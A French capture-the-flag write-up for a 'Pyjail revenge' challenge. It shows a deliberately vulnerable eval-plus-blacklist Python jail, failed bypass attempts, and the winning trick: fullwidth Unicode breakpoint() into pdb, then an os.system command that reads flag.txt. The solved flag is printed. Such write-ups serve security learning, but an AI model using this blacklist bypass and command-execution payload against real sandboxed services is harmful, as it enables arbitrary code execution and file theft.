
--- 

# Description du challenge : 

## Pyjail revenge

### 150

Conçu par Oblivios

Fini les payloads classiques, montre moi vraiment ce que tu peux faire pour contourner ça !

Le flag est situé dans `flag.txt`

`Connexion: nc intro.ctfrei.fr 4452`

--- 

> On a un fichier Python 

```python
#!/usr/local/bin/python3

  

blacklist = ["open", "os", "+", "{", "}", "help", "system", "subprocess", \

"lower", "import", "eval", "exec", "sys", "breakpoint", "getattr", \

"builtins","popen", "read", "input", "class", "chr", "ord", "flag", \

"dict", "globals", "update", "locals"]

  

def check_code(code):

if any([x in code for x in blacklist]):

return False

return True

  

def main():

# Je ban autant de mots pour vous

# forcer à trouver LE trick à utiliser

code = input(">>> ")

if check_code(code):

eval(code)

else:

print("Eh t'as utilisé un truc interdit là !")

  

if __name__ == "__main__":

main()
```

> Apres avoir essaye plein de commande pour contourner les mots interdits : 

```
Exemple : (lambda f: (f()._module.setitem(''.join([b'o', b'p', b'e', b'n']).decode(), None), f()._module[''.join([b'o', b'p', b'e', b'n']).decode()](''.join([b'f', b'l', b'a', b'g', b'.', b't', b'x', b't']).decode()).iter().next()) if len(f) > 0 else None)([x for x in (type([]).base.mro[1:]) if x._name_ == "catch_warnings"])
```

> J'étais dans une impasse. J'ai cherché sur internet des W-U de challenges Pyjail et je suis tombé sur ca : [https://jbnrz.com.cn/index.php/2024/08/15/pyjail/](https://jbnrz.com.cn/index.php/2024/08/15/pyjail/#header-id-39)

> J'ai compris qu'on pouvait bypass avec des commandes donc j'ai essayé : breakpoint() sauf que c'est bannit

> J'ai aussi compris que je pouvais utiliser un encodage différent pour bypass : 

> ｂｒｅａｋｐｏｉｎｔ()

```shell
╭─romso@romso94 ~/Téléchargements
╰─➤  nc intro.ctfrei.fr 4452                                                      130 ↵
>>> ｂｒｅａｋｐｏｉｎｔ()
--Return--
> <string>(1)<module>()->None
(Pdb) help

Documented commands (type help <topic>):
========================================
EOF    c          d        h         list      q        rv       undisplay
a      cl         debug    help      ll        quit     s        unt
alias  clear      disable  ignore    longlist  r        source   until
args   commands   display  interact  n         restart  step     up
b      condition  down     j         next      return   tbreak   w
break  cont       enable   jump      p         retval   u        whatis
bt     continue   exit     l         pp        run      unalias  where

Miscellaneous help topics:
==========================
exec  pdb

(Pdb)
```

> Je vois que j'ai accès à **exec** alors je me génère un payload : 

```python
exec("__import__('os').system('cat flag.txt')")
```

# Résultat : 

```shell
╭─romso@romso94 ~/Téléchargements
╰─➤  nc intro.ctfrei.fr 4452                                                      130 ↵
>>> ｂｒｅａｋｐｏｉｎｔ()
--Return--
> <string>(1)<module>()->None
(Pdb) exec("__import__('os').system('cat flag.txt')")
CTFREI{d4mn_u_g0t_m3_pff}(Pdb)
```

> Flag  : CTFREI{d4mn_u_g0t_m3_pff}
